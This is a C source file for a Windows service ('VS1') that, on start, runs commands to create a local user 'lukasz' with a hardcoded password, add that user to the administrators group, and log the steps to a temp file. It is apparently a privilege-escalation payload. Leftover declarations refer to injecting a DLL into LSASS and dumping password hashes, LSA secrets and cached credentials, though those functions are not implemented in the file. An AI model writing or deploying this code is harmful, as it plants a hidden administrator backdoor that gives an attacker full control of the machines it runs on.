//
// gcc -c Service.c -o Service.exe 
//

#include <windows.h>
#include <string.h>
#include <stdio.h>

typedef BOOL      (WINAPI      *EnumProcesses)( DWORD *, DWORD, DWORD * );
typedef BOOL      (WINAPI *EnumProcessModules)( HANDLE, HMODULE *, DWORD, DWORD * );
typedef DWORD     (WINAPI  *GetModuleBaseName)( HANDLE, HMODULE, CHAR *, DWORD );
typedef HINSTANCE (WINAPI    *LoadLibraryFunc)( CHAR * );
typedef HINSTANCE (WINAPI *GetProcAddressFunc)( HINSTANCE, CHAR * );
typedef HINSTANCE (WINAPI    *FreeLibraryFunc)( HINSTANCE );
typedef INT                     (*DumpLSAInfo)( BOOL, BOOL, BOOL, BOOL );

typedef struct _THREAD_ARGS
{
	LoadLibraryFunc            pLoadLibrary;
	GetProcAddressFunc      pGetProcAddress;
	FreeLibraryFunc            pFreeLibrary;
	CHAR                          szDllName[ 512 ];
	CHAR                     szFunctionName[ 128 ];
	BOOL                       bDumpPWCache;
	BOOL                    bDumpLSASecrets;
	BOOL                      bDumpPWHashes;
	BOOL               bDumpPWHistoryHashes;
} THREAD_ARGS;

INT WINAPI            ServiceMain( INT argc, CHAR *argv[] );
VOID WINAPI  MyServiceCtrlHandler( DWORD dwOption );
VOID              DumpInformation( BOOL *bDumpPWCache, BOOL *bDumpLSASecrets, BOOL *bDumpPWHashes, BOOL *bDumpPWHistoryHashes );
BOOL                  GetLSASSPID( DWORD *dwLSASSPID );
VOID              WriteToErrorLog( CHAR *szErrorMsg );
VOID                    InjectDLL( DWORD *dwLSASSPID, BOOL *bDumpPWCache, BOOL *bDumpLSASecrets, BOOL *bDumpPWHashes, BOOL *bDumpPWHistoryHashes );
static VOID     LsaThreadFunction( THREAD_ARGS *pThreadArgs );
static VOID         DummyFunction( VOID );

SERVICE_STATUS        MyServiceStatus;
SERVICE_STATUS_HANDLE MyServiceStatusHandle;

INT main( INT argc, CHAR *argv[] )
{
	SERVICE_TABLE_ENTRY DispatchTable[] = { { "VS1", (LPSERVICE_MAIN_FUNCTION)ServiceMain }, { NULL, NULL } };

	StartServiceCtrlDispatcher( DispatchTable );

	return 0;
}

INT WINAPI ServiceMain( INT argc, CHAR *argv[] )
{
	MyServiceStatus.dwServiceType             = SERVICE_WIN32;
	MyServiceStatus.dwCurrentState            = SERVICE_STOP;
	MyServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
	MyServiceStatus.dwWin32ExitCode           = 0;
	MyServiceStatus.dwServiceSpecificExitCode = 0;
	MyServiceStatus.dwCheckPoint              = 0;
	MyServiceStatus.dwWaitHint                = 0;

	MyServiceStatusHandle = RegisterServiceCtrlHandler( "VS1", MyServiceCtrlHandler );

	if ( MyServiceStatusHandle != 0 )
	{
		MyServiceStatus.dwCurrentState = SERVICE_START_PENDING;

		if ( SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus ) )
		{
			MyServiceStatus.dwCurrentState = SERVICE_RUNNING;
 
			if ( SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus ) )
			{
				system("echo Starting %DATE% %TIME% >> \"c:\\temp\\bang.txt\"") ;
				system("echo =================================== >> \"c:\\temp\\bang.txt\"") ;
				system("echo 'Running: net user lukasz QAZwsx12+1 /add' >> \"c:\\temp\\bang.txt\"") ;
				system("net user lukasz QAZwsx12+1 /add");
				system("echo 'Running: adding user lukasz to localadministrators' >> \"c:\\temp\\bang.txt\"") ;
				system("net localgroup administrators lukasz /add");
				system("echo 'Running: Complete!' >> \"c:\\temp\\bang.txt\"") ;
			}
		}
	}

	MyServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;

	if ( SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus ) )
	{
		MyServiceStatus.dwCurrentState = SERVICE_ACCEPT_STOP;

		if (SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus ))
			{
				system("echo Stopping %DATE% %TIME% >> \"c:\\Program Files\\VS1\\Service.log\"") ;
				system("echo =================================== >> \"c:\\Program Files\\VS1\\Service.log\"") ;
				
			}
	}

	return 0;
}

VOID WINAPI MyServiceCtrlHandler( DWORD dwOption )
{ 
	switch ( dwOption )
	{
		case SERVICE_CONTROL_PAUSE:
			MyServiceStatus.dwCurrentState = SERVICE_PAUSED;

			SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus );

			break;

		case SERVICE_CONTROL_CONTINUE:
			MyServiceStatus.dwCurrentState = SERVICE_RUNNING;

			SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus );

			break;
 
		case SERVICE_CONTROL_STOP:
			break;

		case SERVICE_CONTROL_INTERROGATE:
			break;

		default:
			break;
	}
}


VOID WriteToErrorLog( CHAR szErrorMsg[] )
{
	FILE *pOutputFile;

	pOutputFile = fopen( "ErrorLog.txt", "r" );

	if ( pOutputFile != NULL )
	{
		fclose( pOutputFile );
	}
	else
	{
		pOutputFile = fopen( "ErrorLog.txt", "w" );

		if ( pOutputFile != NULL )
		{
			fclose( pOutputFile );
		}
	}

	pOutputFile = fopen( "ErrorLog.txt", "a+" );

	if ( pOutputFile != NULL )
	{
		fprintf( pOutputFile, "%s", szErrorMsg );

		fclose( pOutputFile );
	}
}



static VOID DummyFunction( VOID )
{
    return;
}


